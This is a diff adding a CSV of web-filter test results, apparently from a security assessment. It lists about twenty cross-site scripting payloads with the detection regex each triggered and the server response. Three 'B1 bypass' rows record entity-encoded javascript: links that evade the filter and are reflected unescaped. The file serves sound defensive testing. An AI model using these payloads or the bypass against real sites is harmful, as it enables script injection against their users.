@@ -1,0 +1,21 @@
+id,kind,payload,blocked,fired_rule,decoded_href,endpoint_status,reflected_unescaped,parsed_javascript_uri
+A-XSS-01,Part-A baseline,<script>alert(1)</script>,True,(?i)<\s*script,,403,False,False
+XSS-01,Additional XSS corpus,<ScRiPt>alert(2)</ScRiPt>,True,(?i)<\s*script,,403,False,False
+XSS-02,Additional XSS corpus,<script type=text/javascript>alert(3)</script>,True,(?i)<\s*script,,403,False,False
+XSS-03,Additional XSS corpus,<script>alert(document.domain)</script>,True,(?i)<\s*script,,403,False,False
+XSS-04,Additional XSS corpus,<img src=x onerror=alert(1)>,True,(?i)on\w+\s*=,,403,False,False
+XSS-05,Additional XSS corpus,<svg onload=alert(1)>,True,(?i)on\w+\s*=,,403,False,False
+XSS-06,Additional XSS corpus,<body onload=alert(1)>,True,(?i)on\w+\s*=,,403,False,False
+XSS-07,Additional XSS corpus,<input autofocus onfocus=alert(1)>,True,(?i)on\w+\s*=,,403,False,False
+XSS-08,Additional XSS corpus,<details open ontoggle=alert(1)>open</details>,True,(?i)on\w+\s*=,,403,False,False
+XSS-09,Additional XSS corpus,<video><source onerror=alert(1)></video>,True,(?i)on\w+\s*=,,403,False,False
+XSS-10,Additional XSS corpus,<div onmouseover=alert(1)>move</div>,True,(?i)on\w+\s*=,,403,False,False
+XSS-11,Additional XSS corpus,<iframe src=javascript:alert(1)></iframe>,True,(?i)javascript\s*:,,403,False,False
+XSS-12,Additional XSS corpus,<a href=javascript:alert(1)>click</a>,True,(?i)javascript\s*:,javascript:alert(1),403,False,True
+XSS-13,Additional XSS corpus,<object data=javascript:alert(1)></object>,True,(?i)javascript\s*:,,403,False,False
+XSS-14,Additional XSS corpus,<form action=javascript:alert(1)><input type=submit></form>,True,(?i)javascript\s*:,,403,False,False
+XSS-15,Additional XSS corpus,<svg><a xlink:href=javascript:alert(1)>x</a></svg>,True,(?i)javascript\s*:,,403,False,False
+XSS-16,Additional XSS corpus,<marquee onstart=alert(1)>scroll</marquee>,True,(?i)on\w+\s*=,,403,False,False
+B1-XSS-01,B1 bypass,<a href=jav&#x61;script:alert(1)>click</a>,False,,javascript:alert(1),200,True,True
+B1-XSS-02,B1 bypass,<a href=j&#97;vascript:alert(1)>click</a>,False,,javascript:alert(1),200,True,True
+B1-XSS-03,B1 bypass,<a href=java&#x73;cript:alert(1)>click</a>,False,,javascript:alert(1),200,True,True
